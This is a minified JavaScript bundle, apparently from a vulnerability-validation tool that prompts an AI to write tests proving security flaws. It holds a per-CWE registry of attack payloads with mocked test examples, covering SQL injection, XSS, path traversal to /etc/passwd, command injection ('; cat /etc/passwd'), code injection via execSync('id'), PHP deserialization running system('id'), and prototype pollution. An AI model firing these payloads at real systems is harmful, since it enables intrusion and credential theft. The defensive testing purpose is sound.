GP=$1(()=>{YP=[/\.spec\.ts$/,/\.spec\.js$/,/\.test\.ts$/,/\.test\.js$/,/\.spec\.tsx$/,/\.spec\.jsx$/,/\.test\.tsx$/,/\.test\.jsx$/,/_spec\.ts$/,/_spec\.js$/,/_spec\.rb$/,/_test\.rb$/,/^test_.*\.rb$/,/_test\.py$/,/^test_.*\.py$/,/Test\.java$/,/Tests\.java$/,/^Test.*\.java$/,/Spec\.java$/,/Test\.php$/,/_test\.php$/,/_test\.exs$/],WP=new Set(["node_modules","vendor",".git","dist","build","coverage","__pycache__",".pytest_cache","target","deps"])});function VV(X){return HP[X]}function $P(X,Q){let J=VV(X);if(!J)return;let Y=J.frameworkHints[Q]||J.frameworkHints.mocha;return{...J,frameworkHint:Y}}var l8=`RSpec conventions (betterspecs.org): Use context blocks starting with "when"/"with". One expect() per it block. Use let for test variables. Describe with "#method_name". Use expect() syntax (not should).
`,p8=`pytest conventions: Use def test_*() functions (not classes). Use @pytest.fixture for setup. Use plain assert statements. Use @pytest.mark.parametrize for multiple inputs.
`,d8=`Mocha/Vitest conventions: Use describe/it blocks. Use strict assertions (assert.strictEqual over assert.equal). One assertion per it block when possible.
`,i8=`PHPUnit conventions: Use test* methods or @test annotation. Use $this->assert*() methods. Use @dataProvider for multiple inputs.
`,r8=`ExUnit conventions: Use describe/test blocks. Use assert/refute macros. Use setup/setup_all for fixtures.
`,n8=`JUnit 5 conventions: Use @Test annotation. Use @Nested for grouping. Use Assertions.assert*() static methods. Use @ParameterizedTest for multiple inputs.
`,HP,L20;var BV=$1(()=>{HP={"CWE-89":{name:"SQL Injection",assertionGoal:"Import the vulnerable function, mock the database layer, call with SQL injection payload, and assert the payload appears unescaped in the captured query string.",attackPayload:"' OR '1'='1",testStrategy:`PREFERRED (Tier 1  Direct function call):
`+`1. Import/require the module containing the vulnerable function
2. Mock/stub the database connection to capture the SQL query string
3. Call the function with input containing: ' OR '1'='1
4. Assert the captured SQL query contains the literal unescaped payload

`+`ALTERNATIVE (Tier 2  HTTP request):
`+`1. Use the framework test client (supertest, requests, etc.)
2. Send HTTP request to the vulnerable endpoint with injection payload
3. Capture the SQL query via mock/spy on the database layer
4. Assert the query contains unescaped user input

`+`LAST RESORT (Tier 3  Source analysis):
`+`1. Read the source file
2. Check for string concatenation/interpolation in SQL queries
`+'3. Comment: "// Source analysis fallback  could not import module because: <reason>"',frameworkHints:{rspec:l8+`BEHAVIORAL: Use allow().to receive() to stub the database connection and capture the query.
Example:
  let(:malicious_input) { "' OR '1'='1" }
  it 'passes unsanitized input to SQL' do
    allow(ActiveRecord::Base.connection).to receive(:execute).and_call_original
    expect(ActiveRecord::Base.connection).to receive(:execute)
      .with(a_string_including("' OR '1'='1"))
    User.search(malicious_input)
  end`,pytest:p8+`BEHAVIORAL: Use unittest.mock.patch to intercept the query execution.
Example:
  from unittest.mock import patch
  def test_sql_injection():
      with patch('app.db.execute') as mock_db:
          search_users(query="' OR '1'='1")
          sql = mock_db.call_args[0][0]
          assert "' OR '1'='1" in sql`,mocha:d8+`BEHAVIORAL: Use sinon.stub() to capture the query string.
Example:
  const sinon = require('sinon');
  const queryStub = sinon.stub(db, 'query').resolves([]);
  await searchUsers({ query: "' OR '1'='1" });
  assert.ok(queryStub.firstCall.args[0].includes("' OR '1'='1"));`,exunit:r8+`BEHAVIORAL: Use Mox to mock the Ecto.Repo and capture the query.
Define a mock for the repo module and verify the query contains the payload.`,phpunit:i8+`BEHAVIORAL: Use Mockery to mock PDO and capture the query string.
Mock PDO::prepare() or PDO::query() and capture the SQL parameter.`,junit:n8+`BEHAVIORAL: Use Mockito to mock PreparedStatement and capture the query.
Verify that Connection.prepareStatement() receives a string containing the payload.`}},"CWE-79":{name:"Cross-Site Scripting (XSS)",assertionGoal:"Import the vulnerable route handler or template function, call it with XSS payload, and assert the response body contains the unescaped script tag.",attackPayload:"<script>alert('XSS')</script>",testStrategy:`PREFERRED (Tier 1  Direct function call):
`+`1. Import the route handler or template rendering function
2. Mock the response object to capture output
3. Call with input containing: <script>alert('XSS')</script>
4. Assert the output contains literal '<script>' (not '&lt;script&gt;')

`+`ALTERNATIVE (Tier 2  HTTP request):
`+`1. Use the framework test client
2. Send request with XSS payload in the parameter
3. Assert response body contains unescaped '<script>'

`+`LAST RESORT (Tier 3  Source analysis):
`+`1. Read the source file
2. Check for raw output of user input without escaping`,frameworkHints:{rspec:l8+`BEHAVIORAL: Use test client to send request with XSS payload.
Example:
  context 'when input contains script tags' do
    it 'renders without escaping' do
      get '/search', params: { q: "<script>alert('XSS')</script>" }
      expect(response.body).to include('<script>')
    end
  end`,pytest:p8+`BEHAVIORAL: Use Flask/Django test client with XSS payload.
Example:
  def test_xss(client):
      response = client.get('/search?q=<script>alert("XSS")</script>')
      assert b'<script>' in response.data`,mocha:d8+`BEHAVIORAL: Use supertest or the framework test helper.
Example:
  const request = require('supertest');
  it('reflects XSS payload in response', async () => {
    const res = await request(app).get('/search?q=<script>alert("XSS")</script>');
    assert.ok(res.text.includes('<script>'));
  });`,exunit:r8+`BEHAVIORAL: Use Phoenix.ConnTest to send request with XSS payload.
Assert the response body contains the literal script tag without encoding.`,phpunit:i8+`BEHAVIORAL: Use the framework test client or capture output buffer.
Use assertStringContainsString() to verify unescaped HTML.`,junit:n8+`BEHAVIORAL: Use MockMvc to send request with XSS payload.
Verify the response contains literal '<script>' without HTML entity encoding.`}},"CWE-22":{name:"Path Traversal",assertionGoal:"Import the file-serving function, mock filesystem operations, call with traversal payload, and assert the resolved path escapes the intended directory.",attackPayload:"../../../etc/passwd",testStrategy:`PREFERRED (Tier 1  Direct function call):
`+`1. Import the function that handles file paths
2. Mock/stub filesystem operations (fs.readFile, open, etc.)
3. Call with path containing: ../../../etc/passwd
4. Assert the path passed to fs operations contains '../' or resolves outside base dir

`+`ALTERNATIVE (Tier 2  HTTP request):
`+`1. Use test client to request a file with traversal path
2. Assert the response returns the traversed file or a 200 status

`+`LAST RESORT (Tier 3  Source analysis):
`+"1. Read the source and check for missing path.resolve/realpath validation",frameworkHints:{rspec:l8+`BEHAVIORAL: Mock File operations to capture the resolved path.
Example:
  let(:traversal_path) { '../../../etc/passwd' }
  it 'allows path traversal' do
    allow(File).to receive(:read) { |path| @captured_path = path }
    serve_file(traversal_path)
    expect(@captured_path).to include('..')
  end`,pytest:p8+"BEHAVIORAL: Use unittest.mock.patch('builtins.open') to capture the path argument.",mocha:d8+"BEHAVIORAL: Use sinon.stub() on fs.readFile. Capture the path and assert it contains '../'.",exunit:r8+"BEHAVIORAL: Use Mox to mock File operations and capture the path.",phpunit:i8+"BEHAVIORAL: Mock file_get_contents() or fopen() to capture the resolved path.",junit:n8+"BEHAVIORAL: Mock java.io.File or java.nio.file operations to capture the path."}},"CWE-78":{name:"Command Injection",assertionGoal:"Import the function that executes shell commands, mock the command execution, call with injection payload, and assert the captured command contains the injected part.",attackPayload:"; cat /etc/passwd",testStrategy:`PREFERRED (Tier 1  Direct function call):
`+`1. Import the module containing the shell execution
2. Mock child_process.exec/execSync, subprocess.run, system(), etc.
3. Call with input containing: ; cat /etc/passwd
4. Assert the captured command string contains the semicolon and injected command

`+`ALTERNATIVE (Tier 2  HTTP request):
`+`1. Use test client to send request with injection payload
2. Capture the command via mock/spy on the execution function

`+`LAST RESORT (Tier 3  Source analysis):
`+"1. Read source and check for string concatenation in shell commands",frameworkHints:{rspec:l8+`BEHAVIORAL: Stub Kernel.system or Open3 to capture the command.
Example:
  let(:payload) { '127.0.0.1; cat /etc/passwd' }
  it 'passes unsanitized input to shell' do
    expect(Kernel).to receive(:system).with(a_string_including('; cat'))
    ping(payload)
  end`,pytest:p8+`BEHAVIORAL: Use unittest.mock.patch('subprocess.run') to capture the command.
Example:
  from unittest.mock import patch
  def test_command_injection():
      with patch('subprocess.run') as mock_run:
          ping("127.0.0.1; cat /etc/passwd")
          cmd = mock_run.call_args[0][0]
          assert "; cat" in cmd`,mocha:d8+`BEHAVIORAL: Use sinon.stub() on child_process.exec.
Example:
  const cp = require('child_process');
  const execStub = sinon.stub(cp, 'exec');
  ping({ address: "127.0.0.1; cat /etc/passwd" });
  assert.ok(execStub.firstCall.args[0].includes('; cat'));`,exunit:r8+"BEHAVIORAL: Use Mox to mock System.cmd and capture the command string.",phpunit:i8+"BEHAVIORAL: Mock exec(), shell_exec(), or system() to capture the command string.",junit:n8+"BEHAVIORAL: Mock Runtime.exec() or ProcessBuilder to capture the command."}},"CWE-94":{name:"Code Injection",assertionGoal:"Import the function that processes user input, mock the dangerous eval/exec function, call with code injection payload, and assert eval receives attacker-controlled input.",attackPayload:"require('child_process').execSync('id').toString()",testStrategy:`PREFERRED (Tier 1  Direct function call):
`+`1. Import the module containing the vulnerable handler
2. Mock eval(), new Function(), or vm.runInContext()
3. Call the function with malicious input
4. Assert eval was called with the attacker-controlled string

`+`ALTERNATIVE (Tier 2  HTTP request):
`+`1. Use test client to send request with code injection payload
2. Mock eval/exec and verify it was called

`+`LAST RESORT (Tier 3  Source analysis):
`+"1. Read source and detect eval() calls with user-controlled input",frameworkHints:{mocha:d8+`BEHAVIORAL: Stub eval or child_process.exec to capture calls.
Example:
  const cp = require('child_process');
  vi.mock('child_process');
  it('passes user input to exec', () => {
    handler({ body: { code: "require('child_process').exec('id')" } });
    expect(cp.exec).toHaveBeenCalled();
  });`,jest:"BEHAVIORAL: Mock eval or child_process. Use jest.spyOn to capture calls.",rspec:l8+"BEHAVIORAL: Stub eval or Kernel.system to capture code execution calls.",pytest:p8+`BEHAVIORAL: Use unittest.mock.patch('builtins.eval') to intercept eval calls.
Example:
  def test_code_injection():
      with patch('builtins.eval') as mock_eval:
          process_input("__import__('os').system('id')")
          mock_eval.assert_called()`,exunit:r8+"BEHAVIORAL: Mock Code.eval_string to capture eval calls.",phpunit:i8+"BEHAVIORAL: Detect eval(), create_function(), or preg_replace with /e modifier.",junit:n8+"BEHAVIORAL: Mock ScriptEngine.eval() to capture code execution attempts."}},"CWE-502":{name:"Insecure Deserialization",assertionGoal:"Import the function that deserializes data, mock the deserialization mechanism, call with malicious serialized payload, and assert unsafe deserialization occurs.",attackPayload:`O:8:"stdClass":1:{s:4:"code";s:10:"system('id');";}`,testStrategy:`PREFERRED (Tier 1  Direct function call):
`+`1. Import the function that processes serialized data
2. Mock/spy on the deserialization function (Marshal.load, pickle.loads, etc.)
3. Call with malicious serialized payload
4. Assert the unsafe deserializer was called without type checking

`+`ALTERNATIVE (Tier 2  HTTP request):
`+`1. Use test client to send request with serialized payload
2. Verify deserialization occurs without validation

`+`LAST RESORT (Tier 3  Source analysis):
`+"1. Read source and detect Marshal.load/pickle.loads without safe options",frameworkHints:{rspec:l8+`BEHAVIORAL: Spy on Marshal.load to verify it's called with untrusted data.
Example:
  context 'when deserializing user input' do
    it 'uses Marshal.load without validation' do
      allow(Marshal).to receive(:load).and_call_original
      expect(Marshal).to receive(:load)
      process_data(malicious_payload)
    end
  end`,pytest:p8+`BEHAVIORAL: Patch pickle.loads to track deserialization.
Example:
  def test_insecure_deserialization():
      with patch('pickle.loads') as mock_loads:
          process_data(malicious_payload)
          mock_loads.assert_called()`,mocha:d8+`BEHAVIORAL: Track JSON.parse with reviver or detect node-serialize usage.
Stub the unserialize function and verify it receives untrusted input.`,exunit:r8+"BEHAVIORAL: Mock :erlang.binary_to_term and verify [:safe] option is NOT passed.",phpunit:i8+"BEHAVIORAL: Track unserialize() calls and verify no allowed_classes restriction.",junit:n8+"BEHAVIORAL: Mock ObjectInputStream.readObject() to verify type filtering is absent."}},"CWE-1321":{name:"Prototype Pollution",assertionGoal:"Import the function that merges/extends objects, call it with __proto__ payload, and assert that Object.prototype was modified (proving pollution occurred).",attackPayload:'{"__proto__": {"isAdmin": true}}',testStrategy:`PREFERRED (Tier 1  Direct function call):
`+`1. Import the merge/extend/deepCopy function
2. Call with payload: {"__proto__": {"isAdmin": true}}
3. Check if ({}).isAdmin === true (proves prototype was polluted)
4. Clean up: delete Object.prototype.isAdmin

`+`ALTERNATIVE (Tier 2  HTTP request):
`+`1. Send POST request with __proto__ in JSON body
2. Verify a new object inherits the polluted property

`+`LAST RESORT (Tier 3  Source analysis):
`+"1. Read source and detect obj[key] = value without __proto__ guard",frameworkHints:{mocha:d8+`BEHAVIORAL: Call the merge function and check for pollution.
Example:
  it('allows prototype pollution', () => {
    const payload = JSON.parse('{"__proto__": {"polluted": true}}');
    merge({}, payload);
    const obj = {};
    assert.strictEqual(obj.polluted, true, 'Prototype was polluted');
    delete Object.prototype.polluted; // cleanup
  });`,jest:`BEHAVIORAL: Import the merge function and test with __proto__ payload.
Check ({}).polluted === true after merge. Clean up after test.`,rspec:l8+"Ruby is not typically vulnerable to prototype pollution. Check for unsafe merge patterns in JS assets.",pytest:p8+"Python dicts are not vulnerable to prototype pollution. Check for unsafe JS interop or API endpoints.",exunit:r8+"Elixir maps are not vulnerable to prototype pollution. Check for unsafe JS interop.",phpunit:i8+"PHP objects are not typically vulnerable to prototype pollution. Check for unsafe json_decode patterns.",junit:n8+"Java objects are not typically vulnerable to prototype pollution. Check for unsafe JSON deserialization."}},"CWE-798":{name:"Hardcoded Credentials",assertionGoal:"Import the configuration module, inspect the credential values at runtime, and assert they are literal strings rather than environment variable references.",attackPayload:"password123_or_any_literal_secret",testStrategy:`PREFERRED (Tier 1  Direct function call):
`+`1. Import/require the config module that contains credentials
2. Access the credential property (apiKey, password, secret, etc.)
3. Assert it equals a hardcoded literal value (not process.env.X)
4. Or verify typeof is 'string' and doesn't match env var pattern

`+`ALTERNATIVE (Tier 2  Module inspection):
`+`1. Import the module and introspect its exported values
2. Check if secrets are hardcoded constants vs runtime lookups

`+`LAST RESORT (Tier 3  Source analysis):
`+"1. Read source file and regex for hardcoded credential patterns",frameworkHints:{rspec:l8+`BEHAVIORAL: Require the config file and inspect credential values.
Example:
  context 'when checking for hardcoded secrets' do
    it 'contains literal credential values' do
      config = YAML.load_file('config/database.yml')
      expect(config['production']['password']).not_to match(/ENV/)
    end
  end`,pytest:p8+`BEHAVIORAL: Import the config module and check credential values.
Example:
  def test_hardcoded_secrets():
      import app.config as config
      assert not config.API_KEY.startswith("$"), "Key should be from env var"`,mocha:d8+`BEHAVIORAL: Require the config and inspect credential values.
Example:
  const config = require(path.join(process.cwd(), 'config.js'));
  it('contains hardcoded API key', () => {
    assert.ok(typeof config.apiKey === 'string' && config.apiKey.length > 10,
      'API key is hardcoded (should use process.env)');
  });`,exunit:r8+`BEHAVIORAL: Check Application.get_env or config values for hardcoded strings.
Verify credentials are loaded from System.get_env, not hardcoded.`,phpunit:i8+`BEHAVIORAL: Include the config file and inspect credential values.
Verify getenv() is not used and values are hardcoded literals.`,junit:n8+`BEHAVIORAL: Load the config class and inspect credential fields.
Verify System.getenv() is not used for sensitive values.`}},"CWE-1336":{name:"Server-Side Template Injection (SSTI)",assertionGoal:'Import the route handler or template rendering function, call with template injection payload {{7*7}}, and assert the response contains "49" (proving server-side evaluation).',attackPayload:"{{7*7}}",testStrategy:`PREFERRED (Tier 1  Direct function call):
`+`1. Import the function that renders templates with user input
2. Call with payload: {{7*7}}
3. Assert the output contains "49" (template was evaluated server-side)

`+`ALTERNATIVE (Tier 2  HTTP request):
`+`1. Use test client to send request with {{7*7}} in parameter
2. Assert response body contains "49"

`+`LAST RESORT (Tier 3  Source analysis):
`+"1. Read source and detect render_template_string() with user input",frameworkHints:{rspec:l8+`BEHAVIORAL: Use test client with SSTI payload.
Example:
  context 'when input contains template expression' do
    it 'evaluates the template server-side' do
      post '/render', params: { name: "{{7*7}}" }
      expect(response.body).to include('49')
    end
  end`,pytest:p8+`BEHAVIORAL: Use Flask/Django test client with SSTI payload.
Example:
  @pytest.fixture
  def client():
      app.config['TESTING'] = True
      with app.test_client() as client:
          yield client

  def test_ssti(client):
      response = client.post('/vulnerable', data={'name': '{{7*7}}'})
      assert b'49' in response.data`,mocha:d8+`BEHAVIORAL: Use supertest to send SSTI payload.
Check for template evaluation in the response.`,exunit:r8+"BEHAVIORAL: Use Phoenix.ConnTest to send SSTI payload and check for evaluation.",phpunit:i8+"BEHAVIORAL: Use the framework test client to send Twig/Blade injection payload.",junit:n8+"BEHAVIORAL: Use MockMvc to send Freemarker/Velocity injection payload."}}},L20=Object.keys(HP)});function KP(X,Q){let J=Q.map((U)=>U.toLowerCase().trim()),Y="assert",W=-1;for(let U of J){let K=U.includes("assert")?"assert":U,B=Fe1.indexOf(K);if(B>W)W=B,Y=K}let G=new Set(J.map((U)=>U.includes("assert")?"assert":U)),H=Oe1.filter((U)=>!G.has(U.toLowerCase())),$=je1[Y]||"tdd";return Ae1($,Y,H,X==="typescript")}function Ae1(X,Q,J,Y){switch(X){case"jest":return Re1(Q,J,Y);case"bdd":return Le1(Q,J,Y);case"tdd":default:return De1(Q,J,Y)}}function Re1(X,Q,J){let Y=X==="vitest",W;if(Y)W="import { describe, it, expect } from 'vitest';";else W=J?"import { describe, it, expect } from '@jest/globals';":"";return{style:"jest",preferredLibrary:X,syntaxExample:`expect(value).toBe(expected);
expect(string).toMatch(/pattern/);
expect(array).toContain(item);`,importStatement:W,doNotUse:Q.filter((G)=>G!==X)}}function Le1(X,Q,J){if(X==="chai")return{style:"bdd",preferredLibrary:"chai",syntaxExample:`expect(value).to.equal(expected);
expect(string).to.match(/pattern/);
expect(array).to.include(item);`,importStatement:J?"import { expect } from 'chai';":"const { expect } = require('chai');",doNotUse:Q.filter((Y)=>Y!=="chai")};if(X==="should")return{style:"bdd",preferredLibrary:"should",syntaxExample:`value.should.equal(expected);
string.should.match(/pattern/);
array.should.containEql(item);`,importStatement:J?"import 'should';":"require('should');",doNotUse:Q.filter((Y)=>Y!=="should")};return{style:"bdd",preferredLibrary:X,syntaxExample:`expect(value).to.be(expected);
expect(string).to.match(/pattern/);`,importStatement:J?`import expect from '${X}';`:`const expect = require('${X}');`,doNotUse:Q.filter((Y)=>Y!==X)}}function De1(X,Q,J){return{style:"tdd",preferredLibrary:"assert",syntaxExample:`assert.strictEqual(actual, expected);
assert.ok(condition);
assert.deepStrictEqual(obj1, obj2);`,importStatement:J?"import assert from 'assert';":"const assert = require('assert');",doNotUse:Q.filter((Y)=>Y!=="assert"),versionWarning:"Node.js assert module has version-dependent APIs. Use only these safe methods: "+zP.join(", ")+". AVOID these (require Node 16+): "+UP.join(", "),safeAssertions:[...zP],unsafeAssertions:[...UP]}}var je1,Fe1,Oe1,zP,UP;var VP=$1(()=>{je1={should:"bdd",chai:"bdd","expect.js":"bdd",expect:"bdd",jest:"jest",vitest:"jest","@jest/globals":"jest",assert:"tdd","assert (Node built-in)":"tdd","power-assert":"tdd"},Fe1=["assert","assert (Node built-in)","power-assert","should","expect.js","expect","chai","vitest","jest"],Oe1=["chai","should","expect","expect.js","sinon","testdouble","jest","vitest","nock","msw","supertest","assert"],zP=["assert.ok","assert.strictEqual","assert.notStrictEqual","assert.deepStrictEqual","assert.notDeepStrictEqual","assert.throws","assert.doesNotThrow","assert.fail","assert.ifError"],UP=["assert.match","assert.doesNotMatch","assert.rejects","assert.doesNotReject"]});function Ne1(X){if(!X)return"unknown";let Q=X.match(/Cannot find module '([^']+)'/);if(Q)return Q[1];let J=X.match(/No module named '([^']+)'/);if(J)return J[1];let Y=X.match(/cannot load such file -- (\S+)/);if(Y)return Y[1];let W=X.match(/Class '([^']+)' not found/);if(W)return W[1];let G=X.match(/ClassNotFoundException: (\S+)/);if(G)return G[1];return"unknown"}function o5(X,Q,J){let Y="";if(X.error==="TestPassedUnexpectedly"){if(Y+=`
## WHY YOUR PREVIOUS TEST FAILED TO PROVE THE VULNERABILITY
`,Y+=`Your test checked that the function RUNS, not that it's VULNERABLE.
`,Y+=`The ${Q.type||"vulnerability"} occurs because user input is not sanitized.
`,Y+=`Write a test that captures the vulnerable behavior, not just the function output.
`,Q.cweId){let G=VV(Q.cweId);if(G)Y+=`
## ASSERTION STRATEGY FOR ${G.name}
`,Y+=`Goal: ${G.assertionGoal}
`,Y+=`Attack payload to use: ${G.attackPayload}
`,Y+=`Strategy: ${G.testStrategy}
`}}if(X.error==="SyntaxError")Y+=`
## SYNTAX ERROR IN PREVIOUS ATTEMPT
`,Y+=`Error: ${X.errorMessage||"Unknown syntax error"}
`,Y+=`Fix the syntax error and ensure the test file is valid code.
`;if(X.error==="MissingDependency"||X.error==="runtime_error"&&X.errorMessage?.includes("Cannot find module")||X.error==="TestExecutionError"&&X.errorMessage?.includes("MODULE_NOT_FOUND")){let G=Ne1(X.errorMessage||"");if(Y+=`
## MISSING DEPENDENCY IN PREVIOUS ATTEMPT
`,Y+=`You used '${G}' which is not available in this project.
`,J.length>0)Y+=`
Available libraries: ${J.join(", ")}
`,Y+=`Use ONLY these libraries or the language's built-in assertions.
`;else Y+=`Use ONLY the language's built-in assertions (e.g., Node's assert module).
`}if(X.error==="StaticTestNotAcceptable")if(X.retryGuidance){if(Y+=`
## STATIC TEST REJECTED  GENERATE A BEHAVIORAL TEST
`,Y+=`${X.retryGuidance.feedback}
`,Y+=`
### BEHAVIORAL HINT
`,Y+=`${X.retryGuidance.behavioral_hint}
`,X.retryGuidance.few_shot_example)Y+=`
### EXAMPLE BEHAVIORAL TEST
`,Y+=`\`\`\`
${X.retryGuidance.few_shot_example}
\`\`\`
`}else Y+=`
## STATIC TEST REJECTED  GENERATE A BEHAVIORAL TEST
`,Y+=`Your test reads source files and pattern-matches for code patterns. This only proves the pattern exists, NOT that it's exploitable.
`,Y+=`Generate a BEHAVIORAL test that imports the vulnerable module, calls it with malicious input, and asserts on the runtime behavior.
`,Y+=`DO NOT read source files. DO NOT use fs.readFileSync, open(), File.read, or any file-reading approach.
`;if(!Y)Y+=`
## PREVIOUS ATTEMPT FAILED
`,Y+=`Error type: ${X.error}
`,Y+=`Error message: ${X.errorMessage||"Unknown error"}
`,Y+=`Fix the error and ensure tests can run to completion.
`;return Y}var BP=$1(()=>{BV()});function ZP(X,Q){let J=qP[X]||[],Y=we1[X];if(!Y)return J.length>0?[...J]:[];if(!Q)return[...J];let W=new Set(J);switch(X){case"python":Ce1(Q,Y,W);break;case"ruby":Pe1(Q,Y,W);break;case"elixir":Se1(Q,Y,W);break;case"php":Ee1(Q,Y,W);break;case"java":Te1(Q,Y,W);break;case"javascript":case"typescript":if(_e1(Q,Y,W),W.size>J.length&&!W.has("assert (Node built-in)"))W.add("assert (Node built-in)");break}return Array.from(W)}function Ce1(X,Q,J){let Y=X["requirements.txt"]||X["requirements-dev.txt"]||"";for(let G of Q)if(new RegExp(`^${L7(G)}[=<>~!\\s]`,"im").test(Y))J.add(G);let W=X["pyproject.toml"]||"";for(let G of Q){let H=L7(G),$=[new RegExp(`["']${H}["']`,"i"),new RegExp(`${H}\\s*[=<>~]`,"i"),new RegExp(`${H}\\s*,`,"i")];for(let z of $)if(z.test(W)){J.add(G);break}}}function Pe1(X,Q,J){let Y=X.Gemfile||X.gemfile||"";for(let W of Q){let G=L7(W);if(new RegExp(`gem\\s+['"]${G}['"]`,"i").test(Y))J.add(W)}}function Se1(X,Q,J){let Y=X["mix.exs"]||"";for(let W of Q){let G=L7(W);if(new RegExp(`\\{:${G},`,"i").test(Y))J.add(W)}}function Ee1(X,Q,J){let Y=X["composer.json"];if(!Y)return;try{let W=JSON.parse(Y),G={...W.require,...W["require-dev"]};for(let H of Q)for(let $ of Object.keys(G))if(($.split("/").pop()||"").toLowerCase().includes(H.toLowerCase()))J.add(H)}catch{}}function Te1(X,Q,J){let Y=X["pom.xml"]||"";for(let H of Q){let $=L7(H);if(new RegExp(`<artifactId>[^<]*${$}[^<]*</artifactId>`,"i").test(Y))J.add(H)}let W=X["build.gradle"]||X["build.gradle.kts"]||"";for(let H of Q){let $=L7(H);if(new RegExp(`:${$}[^'"]*['"]`,"i").test(W))J.add(H)}let G=Ie1.java||{};for(let[H,$]of Object.entries(G)){let z=L7(H),U=new RegExp(`<artifactId>[^<]*${z}[^<]*</artifactId>`,"i"),K=new RegExp(`${z}`,"i");if(U.test(Y)||K.test(W))for(let B of $)J.add(B)}}function _e1(X,Q,J){let Y=X["package.json"];if(!Y)return;try{let W=JSON.parse(Y),G={...W.dependencies,...W.devDependencies};for(let H of Q)if(G[H])J.add(H)}catch{}}function L7(X){return X.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}function MP(X,Q){let J=qP[X]||[];if(Q.length===0)return!0;let Y=Q.map((H)=>H.toLowerCase());for(let H of ke1)if(Y.includes(H))return!1;let W=J.map((H)=>H.toLowerCase());return Y.filter((H)=>{if(W.includes(H))return!1;if(H.includes("(node built-in)")||H==="assert (node built-in)")return!1;return!0}).length===0}var qP,we1,Ie1,ke1;var jP=$1(()=>{qP={python:["unittest"],ruby:["minitest","test/unit"],elixir:["ExUnit"],php:[],java:[],javascript:["assert"],typescript:["assert"]},we1={python:["pytest","pytest-mock","mock","unittest-mock","hypothesis","faker","factory-boy","responses","httpretty","vcrpy","requests-mock","nose","nose2","tox","coverage"],ruby:["rspec","rspec-rails","rspec-mocks","webmock","vcr","factory_bot","factory_bot_rails","shoulda-matchers","capybara","faker","simplecov","database_cleaner"],elixir:["mox","bypass","ex_machina","faker","mock","mimic","wallaby","hound","stream_data","excoveralls"],php:["phpunit","pest","mockery","prophecy","faker","codeception","phpspec","infection","behat"],java:["junit","junit-jupiter","junit4","junit5","mockito","assertj","hamcrest","testng","easymock","powermock","wiremock","rest-assured"],javascript:["chai","should","expect","expect.js","power-assert","mocha","jest","vitest","ava","tape","jasmine","sinon","testdouble","nock","msw","supertest","superagent","@testing-library/react","@testing-library/jest-dom","enzyme","faker","@faker-js/faker","chance"],typescript:["chai","should","expect","expect.js","power-assert","mocha","jest","vitest","ava","tape","jasmine","sinon","testdouble","nock","msw","supertest","superagent","@testing-library/react","@testing-library/jest-dom","enzyme","faker","@faker-js/faker","chance"]},Ie1={java:{"spring-boot-starter-test":["junit-jupiter","mockito","assertj","hamcrest"],"quarkus-junit5":["junit-jupiter"],"quarkus-junit5-mockito":["junit-jupiter","mockito"],"micronaut-test-junit5":["junit-jupiter"],"dropwizard-testing":["junit-jupiter","assertj"],"vertx-junit5":["junit-jupiter"],"camel-test-junit5":["junit-jupiter"],"helidon-testing-junit5":["junit-jupiter"],"arquillian-junit5-container":["junit-jupiter"]}};ke1=["unittest","minitest","test/unit","exunit"]});class D7{baseUrl;apiKey;cache;static TIMEOUT_MS=1e4;constructor(X,Q=process.env.RSOLV_API_URL||"https://api.rsolv.dev"){this.apiKey=X,this.baseUrl=Q,this.cache=new Map}async getEntry(X,Q){let J=Q?`${X}:${Q}`:X,Y=this.cache.get(J);if(Y)return V.debug(`[RFC-104] Using cached registry entry for ${X}`),Y;try{let W=`${this.baseUrl}/api/v1/vulnerability-types/${X}`;if(Q)W+=`?framework=${encodeURIComponent(Q)}`;let G=new AbortController,H=setTimeout(()=>G.abort(),D7.TIMEOUT_MS),$=await fetch(W,{method:"GET",headers:{"Content-Type":"application/json","x-api-key":this.apiKey},signal:G.signal});if(clearTimeout(H),!$.ok){if($.status===404)return V.debug(`[RFC-104] CWE ${X} not found in platform registry`),null;return V.warn(`[RFC-104] Platform registry API error: ${$.status}`),null}let z=await $.json();return this.cache.set(J,z),V.info(`[RFC-104] Fetched registry entry for ${X} from platform`),z}catch(W){if(W instanceof Error&&W.name==="AbortError")V.warn(`[RFC-104] Platform registry API timed out for ${X}`);else V.warn(`[RFC-104] Platform registry API unavailable: ${W.message}`);return null}}async classifyTest(X,Q,J){try{let Y=`${this.baseUrl}/api/v1/test-classification`,W=new AbortController,G=setTimeout(()=>W.abort(),D7.TIMEOUT_MS),H={test_code:X};if(Q)H.cwe_id=Q;if(J)H.framework=J;let $=await fetch(Y,{method:"POST",headers:{"Content-Type":"application/json","x-api-key":this.apiKey},body:JSON.stringify(H),signal:W.signal});if(clearTimeout(G),!$.ok)return V.warn(`[RFC-104] Test classification API error: ${$.status}`),null;let z=await $.json();return V.info(`[RFC-104] Test classified: is_static=${z.is_static}, reason=${z.reason}`),z}catch(Y){if(Y instanceof Error&&Y.name==="AbortError")V.warn("[RFC-104] Test classification API timed out");else V.warn(`[RFC-104] Test classification API unavailable: ${Y.message}`);return null}}async classifyTestResult(X,Q,J){try{let Y=`${this.baseUrl}/api/v1/test-result-classification`,W=new AbortController,G=setTimeout(()=>W.abort(),D7.TIMEOUT_MS),H=await fetch(Y,{method:"POST",headers:{"Content-Type":"application/json","x-api-key":this.apiKey},body:JSON.stringify({exit_code:X,stdout:Q,stderr:J}),signal:W.signal});if(clearTimeout(G),!H.ok)return V.warn(`[RFC-103] Test result classification API error: ${H.status}`),null;let $=await H.json();return V.info(`[RFC-103] Test result classified: type=${$.type}, is_valid_failure=${$.is_valid_failure}`),$}catch(Y){if(Y instanceof Error&&Y.name==="AbortError")V.warn("[RFC-103] Test result classification API timed out");else V.warn(`[RFC-103] Test result classification API unavailable: ${Y.message}`);return null}}static getFewShotExample(X,Q){if(X.few_shot_example)return X.few_shot_example;if(X.few_shot_examples&&X.few_shot_examples[Q])return X.few_shot_examples[Q];return null}}var FP=$1(()=>{y1()});var qG={};Y9(qG,{ValidationMode:()=>OP});import{execSync as n0}from"child_process";import*as a1 from"fs";import*as W0 from"path";class OP{config;falsePositiveCache;repoPath;phaseDataClient;testIntegrationClient;registryClient;lastTestOutput="";lastTestStderr="";projectAiContext="";projectEcosystems=[];availableTestLibraries=[];lastFailureClassificationType="";lastFailureIsInfrastructure=!1;deferredSetupCommands=[];systemPackagesToInstall=[];noTestFrameworkAvailable=!1;lastRetryCount=0;lastClassificationSource="local";constructor(X,Q){if(this.config=X,this.repoPath=Q||process.cwd(),this.falsePositiveCache=new 